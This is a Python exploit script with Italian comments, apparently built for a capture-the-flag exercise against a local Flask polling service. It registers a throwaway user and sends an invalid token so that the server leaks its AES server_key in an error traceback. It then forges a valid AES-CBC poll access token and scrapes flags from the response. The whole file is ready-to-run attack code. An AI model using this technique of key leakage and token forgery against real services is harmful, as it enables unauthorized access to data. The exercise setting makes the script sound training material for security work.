'''

Vulnerabilità: Cryptographic Failures
L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a sondaggi tramite l'utilizzo di un token.
La logica di attacco è la stessa di quella adoperata in exploit_key.py, con l'unica differenza che qui la server_key, utile
per la generazione di un token valido, viene recuperata dinamicamente dal traceback.

'''



import requests
import random
import string
import re
from Crypto.Cipher import AES



# IP locale e port per il server Flask
ip = "127.0.0.1"
port = 5000

# Regex per cercare la flag: ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Regex per cercare la server_key nel traceback
server_key_regex = re.compile(r"server_key=b'([^']+)'")





def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perche sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token




def exploit():
    try:
        # Generazione casuale di un utente
        username_length = random.randint(5, 64)
        password_length = random.randint(5, 64)
        username = ''.join(random.choices(string.ascii_letters + string.digits, k = username_length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k = password_length))

        print(f"Registrando l'utente con username: {username} e password: {password}")
        utente = {
            'utente': username,
            'password': password
        }

        # Creiamo una sessione per l'utente
        s = requests.Session()

        # Registrazione dell'utente
        register_response = s.post(f"http://{ip}:{port}/register", data = utente)
        print(f"Status code della registrazione: {register_response.status_code}")
        if register_response.status_code != 200:
            print(f"Errore durante la registrazione per {username}")

        # Login dell'utente
        login_response = s.post(f"http://{ip}:{port}/login", data = utente)
        print(f"Status code del login: {login_response.status_code}")
        if login_response.status_code != 200:
            print(f"Errore durante il login per {username}")
            
        # Accesso al sondaggio con un token (volutamente) invalido
        token = "AAAAAAAAAAAAAAAA" 
        access_response = s.post(f"http://{ip}:{port}/access_poll", data = {"token": token})

        if "Errore" in access_response.text:
            print("Errore: token non valido per il sondaggio.")
            # Analisi del traceback per recuperare la server_key
            tb = access_response.text
            print("Errore nel traceback!")
            
            # Eseguiamo una ricerca con la regex per trovare la server_key nel traceback
            match = server_key_regex.search(tb)
            if match:
                server_key = match.group(1)
                print(f"Server Key trovata: {server_key}")
                if isinstance(server_key, str):
                    server_key = server_key.encode()
            else:
                print("Server Key non trovata nel traceback.")
                return  # Se la server_key non viene trovata, fermati
            
            # Ora che abbiamo la server_key, creiamo il token valido
            token = create_token("69d8239d955ba0a9", server_key)
        
            # Accesso al sondaggio con il token valido
            access_response = s.post(f"http://{ip}:{port}/access_poll", data = {"token": token.hex()})
            
            if "Token invalido" in access_response.text:
                print("Errore: Token non valido per il sondaggio.")
            else:
                print("Token valido! Accesso riuscito.")

                # Se l'accesso al sondaggio è andato a buon fine, si cerca all'interno della pagina per trovare le flag
                flags = set(flag_regex.findall(access_response.text))  # Trova le flag nel risultato
                print(f"Trovate flag da {ip}: {flags}")
        else:
            print("Token valido! Accesso riuscito.")
        
    except Exception as e:
        print(f"Errore durante l'exploit per {ip}: {str(e)}")




# Esecuzione dell'exploit
if __name__ == '__main__':
    exploit()
